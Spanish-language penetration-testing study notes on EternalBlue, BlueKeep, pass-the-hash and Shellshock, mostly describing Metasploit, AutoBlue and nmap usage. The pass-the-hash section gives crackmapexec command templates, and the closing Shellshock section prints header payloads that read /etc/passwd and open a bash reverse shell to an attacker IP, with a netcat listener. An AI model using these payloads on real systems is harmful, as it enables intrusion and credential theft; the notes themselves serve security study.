---
title: "Vulnerability Analysis"
topic: "Análisis de Vulnerabilidades"
layout: default
---

------------
ETERNAL BLUE
------------
- Eternal blue es el nombre que se le da a una colección de vulnerabilidades de Windows que permitia 
a los atacantes ejecutar remotamente y de manera arbitraria código y obtener acceso al sistema Windows 
y a la red a la que pertenencia este objetivo en concreto.
- Fue desarrollado por la NSA para sacar ventajas de la MS17-010.

- Explota ventajas  de las vulnerabilidades del protocolo SMBv1 de Windows que permite a los atacantes 
enviar paquetes crafteados que ejecutan de manera arbitraria comandos.

- Tiene un módulo auxiliar dentro de METASPLOIT para comprobar si el objetivo es vulnerable a eternal blue, y si es así,
otro para explotar la vulnerabilidad en equipos no actualizados.

¡OJO! TAMBIEN EXSITE UN SCRIPT PARA CONOCER SI UN OBJETIVO ES VULNERABLE A ETERNAL BLUE CON NMAP!

- Para usar el AutoBlue, debemos descargarlo del repositorio de GITHUB, dar permisos de ejecucíon al *.sh, y ejecutarlo.

Debemos llevar a cabo los que nos pide el script, configurar una serie de parametros y una vez terminado, abrir con netcat
los puertos que hayamos especificado.

- Se nos habrán creado una serie de archivos *.bin, daremos permisos de ejecucíon al que nos interese dependiendo de la
arquitectura y versión de nuestro sistema objetivo.

- Dentro de la carpeta de EternalBlue, están los exploit con python que son los que ejecutaremos junto el otro archivo.

Debemos ejecutarlo con python, especificando la IP de nuestro objetivo y el archivo correspondiente *.bin.

- Con todo esto, en el netcat abierto se nos iniciará una sesión de Shell o meterpeter dependiendo de lo que hayamos especificado.

=== METASPLOIT ====
Con metasploit es más fácil, creas un esapcio de trabajo, buscar y eejcutas los módulos auxiliares, ajustar los parámetros
y a funcionar.

---------
BLUE KEEP
---------
- Es el nombre que se le da a una vulnerabilidad de Windows que se ejecurta con código arbitrario.
Permite a los atacantes acceso al kernel, con privilegios elevados, y por tanto acceso al sistema.
Muchos sistemas son vulnerables a blue keep en el mundo.

SE RECOMIENDA CON ESTA VULNERABILIDAD USAR EXPLOTACIONES ACREDITADAS Y VERIFICADAS.
- En nuestro caso usaremos metasploit.
¡OJO! Como estamos hablando de targetear el espacio del kernel, algunos espacios de memoria o apps pueden crasearse.
- Solo funciona en versiones de 64 bits este módulo auxiliar de explotación.

---------------------
PASS THE HASH ATTACKS
---------------------
- Una vez obtenido los NTLM HASHES ¿Qué más podemos hacer con ellos a parte de cracquearlos?
PASS THE HASH es una técnica de explotación que involucra capturamiento o recolecta de NTLM HASHES
o contraseñas en texto plano y las utiliza para autenticarse en el objetivo a través de SMB.

- Las herramientas que se pueden usar entre ortas son: metasploit PsExec MODULE o Crackmapexec.

- Esta técnica nos dara acceso al objetivo con las credenciales legítimas en vez de obtener acceso mediante la explotación 
de un servicio.

- ES UN MÓDULO PROBLEMÁTICO QUE PUEDE GENERAR PROBLEMAS CON LOS TARGETS EN METASPLOIT.

- Con crackmapexec seguimos la siguiente estructura: crackmapexec smb (ip) -u (usuario) -p (hash NTLM).
esto nos da acceso, y luego para ejecutar comandos usamos:
crackmapexec smb (ip) -u (usuario) -p (hash NTLM) -x "comando".

-----------------------------------
FREQUENTLY EXPLOITED LINUX SERVICES
-----------------------------------
En esta sección conoceremos los servicios más frecuentamente explotados en un SO Linux.

=== TABLA DE PROTOCOLO/SERVICIO/PUERTO/PROPOSITO ===
APACHE - TCP ports 80/443 - Plataforma web de código abierto.
SSH - TCP port 22 - Es un protocolo de acceso remoto y criptográfico para controlar sistemas de manera segura. Sucesor de Telnet.
FTP -TCP port 21 - Es un protocolo de intercambio de archivos entre host dentro de una red local o LAN.
SAMBA - TCP port 445 - Implementación de Linux a SMB, permitiendo acceso de sistemas Windows a dispositivos Linux.

------------------
ANALYSIS SHELLSOCK
------------------
- Es una de las vulnerabilidades que ha afectado a Linux durante los últimos años.
involucra dos servicios: Apache y bash.

- Permite a los atacantes ejecutar comandos remotamente de manera arbitraria en bash. Obteniendo así acceso remoto al sistema.
Bash es un Nix(Unix based system) shell que forma parte del proyecto GNU/linux siendo por ende el shell por defecto de la mayoria de distros Linux.

- Esta vulnerabilidad permite ejecutar de manera maliciosa scripts CGI(scripts que sacan información del servidor para mostrarla en la web) del servidor web.

- podemos usar dos herramientas: metasploit o scripts de nmap(SHELLSOCK).
Estas herramientas son para saber si el objtivo es vulnerable.

- Para explotarlo, usarmos proxy burp. Esta herramienta nos permite abrir una página de ejecución de encabezado del servidor web para porobar comandos bash.

COMANDO: {} { :; } ; echo; echo; /bin/bash -c 'cat /etcpasswd'

COMANDO: {} { :; } ; echo; echo; /bin/bash -c 'bash -i>&/dev/tcp/ip_atacante 0>&1'
En nuestra máquina abrirmos un puerto para netcat: nc -nvlp 1234.





